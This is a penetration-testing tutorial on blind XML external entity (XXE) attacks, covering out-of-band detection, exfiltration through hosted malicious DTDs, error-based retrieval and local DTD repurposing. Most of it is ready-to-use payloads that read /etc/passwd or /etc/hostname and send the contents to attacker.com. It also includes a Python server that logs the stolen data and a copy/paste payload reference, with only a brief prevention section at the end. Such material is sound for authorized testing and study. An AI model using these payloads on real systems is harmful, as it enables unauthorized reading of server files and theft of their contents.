# Finding and exploiting blind XXE vulnerabilities

Blind XXE occurs when an XML parser processes external entities but the application **doesn't return the entity values** in responses. You can't directly read files in the output, making exploitation harder but still possible via out-of-band (OOB) channels and error messages.

Blind XXE is common because applications often parse XML in backend processes, log files, or async jobs where responses aren't returned to the user.

> Only test systems you own or are explicitly authorized to assess.

## Why XXE is "blind" (and how to work around it)

In regular XXE, you see the result:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>
```

Response includes file content:
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

In blind XXE, the same payload is processed but you only see:
```text
Success
```

Or a generic error with no file content.

## Detection via out-of-band (OOB) techniques

Since you can't see direct output, make the server contact your system and observe the interaction.

### Method 1: Basic OOB detection (general entities)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://unique-id.burpcollaborator.net"> ]>
<data>&xxe;</data>
```

Watch for DNS query or HTTP request to your domain (use Burp Collaborator or your own server).

If you see the callback, XXE is confirmed.

### Method 2: OOB detection via parameter entities (bypasses some filters)
Some applications block general entities but allow parameter entities.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://unique-id.burpcollaborator.net"> %xxe; ]>
<data>test</data>
```

Key difference:
- `<!ENTITY % xxe ...>` defines a parameter entity (note the `%`)
- `%xxe;` references it (also uses `%`, not `&`)
- Parameter entities are processed during DTD parsing, not document parsing

This often bypasses input validation that only checks for `&` references.

## Data exfiltration via out-of-band (chained external DTD)

Once you confirm blind XXE, exfiltrate data by:
1. Hosting a malicious DTD on your server
2. Making the target load and execute your DTD
3. Your DTD reads files and sends content to your server

### Step 1: Create malicious DTD (host on your server)
File: `http://attacker.com/malicious.dtd`
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/exfil?data=%file;'>">
%eval;
%exfil;
```

Breakdown:
- `%file` reads `/etc/passwd`
- `%eval` defines `%exfil` with file content embedded in URL
- `&#x25;` is HTML entity for `%` (needed to avoid premature parsing)
- `%eval;` executes the definition
- `%exfil;` triggers HTTP request with file data in query string

### Step 2: Inject payload that loads your DTD
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">
  %xxe;
]>
<data>test</data>
```

Execution flow:
1. Parser reads DOCTYPE
2. Loads external DTD from attacker.com
3. Processes malicious DTD instructions
4. Reads `/etc/passwd`
5. Sends content to attacker.com in HTTP request

### Step 3: Receive exfiltrated data
Your server receives:
```text
GET /exfil?data=root:x:0:0:root:/root:/bin/bash%0Adaemon:x:1:1:... HTTP/1.1
Host: attacker.com
```

### Practical server setup (Python example)
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        
        if parsed.path == '/malicious.dtd':
            # Serve malicious DTD
            dtd = '''<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com:8000/exfil?data=%file;'>">
%eval;
%exfil;'''
            self.send_response(200)
            self.send_header('Content-Type', 'application/xml-dtd')
            self.end_headers()
            self.wfile.write(dtd.encode())
            
        elif parsed.path.startswith('/exfil'):
            # Receive exfiltrated data
            params = parse_qs(parsed.query)
            data = params.get('data', [''])[0]
            print(f"\n[+] Exfiltrated data:\n{data}\n")
            self.send_response(200)
            self.end_headers()

HTTPServer(('0.0.0.0', 8000), Handler).serve_forever()
```

### Handling special characters (newlines, etc.)
Some parsers fail when file content contains newlines (like `/etc/passwd`). Workarounds:

#### Use FTP protocol (if supported):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com:21/%file;'>">
%eval;
%exfil;
```

FTP often handles newlines better than HTTP.

#### Target files without newlines:
```text
file:///etc/hostname
file:///proc/sys/kernel/hostname
file:///proc/version
```

#### Use PHP filters to base64 encode (PHP environments):
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

Receive base64-encoded data (no newline issues):
```text
GET /?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb...
```

Decode:
```bash
echo "cm9vdDp4OjA6..." | base64 -d
```

## Error-based data retrieval (when OOB is blocked)

If outbound connections are blocked, trigger parsing errors that include file content in error messages.

### Malicious DTD for error-based exfiltration
File: `http://attacker.com/error.dtd` (or inline if external DTD loading works)
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

How it works:
1. `%file` reads `/etc/passwd`
2. `%error` tries to load a file at `/nonexistent/[passwd content]`
3. Parser fails and includes the attempted path in error message

### Payload (external DTD):
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/error.dtd">
  %xxe;
]>
<data>test</data>
```

### Expected error message:
```text
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

The error message contains the file content.

## Local DTD repurposing (when external DTD loading is blocked)

When both OOB connections and external DTD loading are blocked, exploit a loophole in the XML spec: you can redefine entities from local DTD files.

### Why this works:
- XML spec prohibits defining parameter entities within internal DTDs
- BUT: if you load an external DTD (from local filesystem), you CAN redefine entities it declares
- This lets you inject error-based payloads into local DTD entities

### Step 1: Find a local DTD file
Common locations (Linux):
```text
/usr/share/yelp/dtd/docbookx.dtd
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/share/xml/svg/svg10.dtd
/usr/local/app/schema.dtd (application-specific)
```

Common locations (Windows):
```text
C:\Windows\System32\wbem\xml\cim20.dtd
C:\Program Files\...\schema.dtd
```

### Step 2: Test for DTD file presence
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  %local_dtd;
]>
<data>test</data>
```

If no error, the file exists. If error like "file not found", try another path.

### Step 3: Identify an entity to redefine
Download the DTD file you found (many are from open-source projects) and look for parameter entity definitions:

```xml
<!ENTITY % ISOLat2 SYSTEM "isolat2.ent">
```

Note the entity name (e.g., `ISOLat2`).

### Step 4: Craft payload that redefines the entity
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOLat2 '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<data>test</data>
```

Explanation:
- Load local DTD (`local_dtd`)
- Redefine `ISOLat2` entity with error-based payload
- `&#x25;` = `%`, `&#x26;` = `&`, `&#x27;` = `'` (HTML entities to avoid premature parsing)
- When `%local_dtd;` executes, it processes the original DTD but uses your redefined `ISOLat2`
- Error message reveals file content

### Practical entity names to try (common DTD files)
For `/usr/share/yelp/dtd/docbookx.dtd`:
```text
ISOamsa, ISOamsb, ISOamsc, ISOamsn, ISOamso, ISOamsr, ISObox, ISOcyr1, ISOcyr2, ISOdia, ISOgrk1, ISOgrk2, ISOgrk3, ISOgrk4, ISOlat1, ISOlat2, ISOnum, ISOpub, ISOtech
```

## Testing workflow (practical steps)

### Step 1: Confirm XXE with basic OOB
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://test1.burpcollaborator.net"> ]>
<data>&xxe;</data>
```

If blocked, try parameter entities:
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://test2.burpcollaborator.net"> %xxe; ]>
<data>test</data>
```

### Step 2: Attempt data exfiltration via OOB
Host malicious DTD:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

Inject:
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"> %xxe; ]>
<data>test</data>
```

### Step 3: If OOB blocked, try error-based
Host error DTD:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Inject and look for error messages in response.

### Step 4: If external DTD loading blocked, enumerate local DTDs
```xml
<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd; ]>
```

Try common paths until you find one that exists.

### Step 5: Redefine entity in local DTD
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/hostname">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<data>test</data>
```

## Quick payload reference (copy/paste)

Basic OOB detection:
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://unique.burpcollaborator.net"> %xxe; ]>
<data>test</data>
```

OOB exfiltration (requires hosted DTD):
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/exfil.dtd"> %xxe; ]>
<data>test</data>
```

Contents of `exfil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

Error-based (inline):
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<data>test</data>
```

Local DTD repurposing:
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/hostname">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<data>test</data>
```

## Prevention (same as regular XXE)

Disable external entity processing in your XML parser (see the main XXE prevention section for language-specific examples).

Key controls:
- Disable DOCTYPE declarations entirely (preferred)
- Disable external entity resolution
- Disable parameter entity processing
- Use safe parser configurations
